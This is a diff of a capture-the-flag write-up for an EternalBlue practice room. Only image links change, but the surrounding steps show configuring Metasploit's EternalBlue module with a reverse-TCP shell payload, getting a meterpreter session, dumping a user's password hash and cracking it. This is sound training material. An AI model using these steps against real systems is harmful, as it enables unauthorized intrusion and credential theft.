@@ -116,9 +116,9 @@ we will go with EternalBlue since it s this room is made for it
 # Gain Access :
 
 Let's launch Metasploit and look for eternal blue 
-![[Pasted image 20250714154943.png]]
+![screenshot](imgs/scan1.png)
 we will choose the first one now let s ceck what options do we need to provide so we ccan run the exploit 
-![[Pasted image 20250714155342.png]]
+![screenshot](imgs/scan2.png)
 the only required option is `RHOSTS` which should be the one provided with your machine and i ll have to change the `LHOST` which was an ip address that i got from a different room
 you can change them by typing :
 
@@ -136,7 +136,7 @@ set payload windows/x64/shell/reverse_tcp
 now everything is set let s run the exploit you can simpy do that buy typing 
 `run` or `exploit` .
 if everything worked fine you should get the meterpreter which looks like this 
-![[Pasted image 20250714160401.png]]
+![screenshot](imgs/scan3.png)
 now  we ll try to escalate privileges .
 
 # Escalation :
@@ -163,7 +163,7 @@ Active sessions
 to switch to the meterpreter session type `sessions -i 2` and VOILA you have a meterpreter 
 you can do lots of stuff  like showing the systems info and seeing the running processes.
 you can check [Metasploit cheat sheet](https://github.com/r4y-br/Cybersecurity-101/blob/main/Metasploit.md) to try learn the commands tthat you can run on the meterpreter .
-![[Pasted image 20250714162621.png]]
+![screenshot](imgs/scan4.png)
 
 # Crack :
 the room asks us to crack  the non default user's password  we can dump the hashes  by running :
@@ -177,7 +177,7 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ````
 
 now we will need to crack the passwords hash we  can either use john the ripper or use   [crackstation](https://crackstation.net/) which is more convinient .
-![[Pasted image 20250714163700.png]]
+![screenshot](imgs/scan5.png)
 
 # Finding the flags :
 
